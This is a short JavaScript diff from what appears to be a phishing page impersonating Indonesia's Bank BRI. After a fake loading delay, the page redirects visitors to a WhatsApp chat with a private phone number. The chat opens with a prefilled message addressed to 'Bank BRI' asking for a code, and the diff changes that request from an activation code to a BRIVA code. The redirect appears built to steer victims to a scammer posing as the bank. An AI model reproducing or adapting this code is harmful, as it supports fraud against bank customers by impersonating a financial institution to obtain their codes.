@@ -11,7 +11,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/6282240003166?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20request%20Kode%20Aktivasi';
+location.href='https://wa.me/6282240003166?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20request%20Kode%20BRIVA';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
